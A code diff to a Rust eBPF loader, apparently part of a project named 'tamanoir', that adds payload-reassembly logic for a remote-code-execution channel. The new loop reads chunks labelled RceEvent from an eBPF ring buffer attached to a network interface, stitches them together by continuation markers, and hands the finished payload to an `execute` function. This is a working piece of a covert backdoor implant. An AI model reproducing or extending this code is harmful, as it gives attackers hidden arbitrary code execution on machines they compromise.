@@ -1,3 +1,4 @@
+use core::str;
 use std::{net::Ipv4Addr, os::fd::AsRawFd, thread, time::Duration};
 
 use aya::{
@@ -5,10 +6,12 @@ use aya::{
     EbpfLoader,
 };
 use clap::Parser;
-use log::{debug, info, warn};
+use log::{debug, warn};
 use mio::{unix::SourceFd, Events, Interest, Poll, Token};
-use tamanoir::ringbuf::{Rce, RingBuffer};
+use tamanoir::{rce::execute, ringbuf::RingBuffer};
+use tamanoir_common::{ContinuationByte, RceEvent};
 use tokio::signal;
+
 #[derive(Debug, Parser)]
 struct Opt {
     #[clap(short, long, default_value = "wlan0")]
@@ -82,6 +85,8 @@ async fn main() -> anyhow::Result<()> {
             let mut poll = Poll::new().unwrap();
             let mut events = Events::with_capacity(128);
             let mut ring_buf = RingBuffer::new(&mut ebpf);
+            let mut payload: Vec<u8> = vec![];
+
             poll.registry()
                 .register(
                     &mut SourceFd(&ring_buf.buffer.as_raw_fd()),
@@ -92,25 +97,34 @@ async fn main() -> anyhow::Result<()> {
             loop {
                 poll.poll(&mut events, Some(Duration::from_millis(100)))
                     .unwrap();
-                // if terminate.load(std::sync::atomic::Ordering::Relaxed) {
-                //     break;
-                // }
+
                 for event in &events {
-                    // if terminate.load(std::sync::atomic::Ordering::Relaxed) {
-                    //     break;
-                    // }
                     if event.token() == Token(0) && event.is_readable() {
-                        // if terminate.load(std::sync::atomic::Ordering::Relaxed) {
-                        //     break;
-                        // }
                         while let Some(item) = ring_buf._next() {
-                            // if terminate.load(std::sync::atomic::Ordering::Relaxed) {
-                            //     break;
-                            // }
-                            let rce: [u8; Rce::LEN] = item.to_owned().try_into().unwrap();
-                            let rce = rce.as_ptr() as *const Rce;
+                            let rce: [u8; RceEvent::LEN] = item.to_owned().try_into().unwrap();
+                            let rce = rce.as_ptr() as *const RceEvent;
                             let rce = unsafe { *rce };
-                            info!("{:#?}", rce);
+                            if rce.is_first_batch {
+                                debug!("payload batch transmission start");
+                                if let ContinuationByte::Reset | ContinuationByte::ResetEnd =
+                                    rce.event_type
+                                {
+                                    debug!("clear payload");
+                                    payload.clear()
+                                }
+                            }
+
+                            payload.extend_from_slice(rce.payload());
+                            debug!("transmitted payload is now {} bytes long ", payload.len());
+                            if rce.is_last_batch {
+                                debug!("payload batch transmission is finished!");
+                                if let ContinuationByte::End | ContinuationByte::ResetEnd =
+                                    rce.event_type
+                                {
+                                    debug!("payload full transmission is finished, sending it to executor");
+                                    let _ = execute(&payload);
+                                }
+                            }
                         }
                     }
                 }
